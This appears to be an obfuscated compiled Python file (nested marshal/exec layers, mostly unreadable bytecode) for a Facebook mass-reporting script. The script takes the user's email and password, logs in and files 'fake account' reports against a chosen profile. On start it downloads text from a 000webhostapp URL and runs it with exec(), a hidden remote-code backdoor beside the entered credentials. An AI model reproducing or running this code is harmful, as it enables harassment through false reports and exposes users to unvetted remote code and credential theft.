B
    ��]\$  �               @   s   d dl Z ee �d�� dS )�    Ns�  �               @   s   d dl Z ee �d�� dS )�    Ns!  �               @   s   d dl Z ee �d�� dS )�    Ns�  �               @   s   d dl Z ee �d�� dS )�    Ns)  �               @   s   d dl Z ee �d�� dS )�    Ns�  �               @   s   d dl Z ee �d�� dS )�    Ns1  �               @   s   d dl Z ee �d�� dS )�    Ns�  �               @   s   d dl Z ee �d�� dS )�    Ns9  �               @   s   d dl Z ee �d�� dS )�    Ns�
  �               @   s   d dl Z ee �d�� dS )�    NsA
  �               @   s�   d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlm	Z
 e�d� e�� Ze�d� e�d� e�d� e�d� e�e
� � dZdd� Zd	d
� Zedkr�e�  e�  dS )�    N)�LWPCookieJar�clearTFzids.txtc              C   sP   t d� t�d� t d� yt�d�j} tt| �� W n tk
rJ   Y nX d S )Nz-----------------------------zfiglet -f smslant "Report"z=============================z%https://gratiz.000webhostapp.com/spam)	�print�os�system�requests�get�text�exec�str�ImportError)�a� r   � �check   s    
 r   c              C   s�  d} t d�}t d�}t�| � tjdd� d�|�tjd< d�|�tjd< t��  d	t�� k�r�td
� t d�}d| }|} t�| � t	�
dt�� �� �d��}t|�dk�r�t d�}ttd�}|�� }||kr�td� td� �q�t�� �� }	tj|	dd�}
t|
�dk�r��x�|
jddd�D �]�}d|d k�r|d }t�|� y,dtj_tjdd� dgtjd< t��  W n4 tk
�r� } zt|� td� W d d }~X Y nX y,dtj_tjdd� dgtjd< t��  W n4 tk
�r } zt|� td� W d d }~X Y nX ybdtj_tjdd� dgtjd < t��  ttd!�}|�|� t�d"� td#� t�d$� t�  W n4 tk
�r� } zt|� td� W d d }~X Y nX �qW ntd%� d S )&Nz https://m.facebook.com/login.phpz[#] Enter Email: z[#] Enter Password: r   )Znrz{}�emailZpasszsave-devicez[#] Login success z[#] Username Target : zhttps://m.facebook.com/z<title>(.*?)</title>zutf-8z[#] Enter Untuk Melanjutkan  �rz.         Oops 405zAYou have already reported this account using the account you usedzhtml.parser)Zfeaturesr   T)�hrefZrapid_reportr   Zprofile_fake_account�tagz
    Bad406ZFRX_PROFILE_REPORT_CONFIRMATIONZ
action_keyZyes�checked�w�   z[#] Sukses Reported�   z&[#] FAILED INTO LOGIN IN YOUR ACCOUNT )�input�br�openZselect_form�formatZformZsubmitZgeturlr   �reZfindallZresponse�read�decode�len�filee�exit�bs4ZBeautifulSoupZfind_allZ_factoryZis_html�	Exception�write�time�sleep)Zurlr   Zpasswr�idZmyr   ZdrayZuohZuhohZbsZbb�xZcadow�fZjjr   r   r   �report   sx    








"r+   �__main__)r   Zrandomr&   r#   r   �sysZ	mechanizer   Zhttp.cookiejarr   Zkukir   ZBrowserr   Zset_handle_equivZset_handle_redirectZset_handle_refererZset_handle_robotsZset_cookiejarr!   r   r+   �__name__r   r   r   r   �<module>   s   @




@)�marshal�exec�loads� r   r   � �<module>   s   )�marshal�exec�loads� r   r   � �<module>   s   )�marshal�exec�loads� r   r   � �<module>   s   )�marshal�exec�loads� r   r   � �<module>   s   )�marshal�exec�loads� r   r   � �<module>   s   )�marshal�exec�loads� r   r   � �<module>   s   )�marshal�exec�loads� r   r   � �<module>   s   )�marshal�exec�loads� r   r   � �<module>   s   )�marshal�exec�loads� r   r   � �<module>   s   )�marshal�exec�loads� r   r   �repor.py�<module>   s   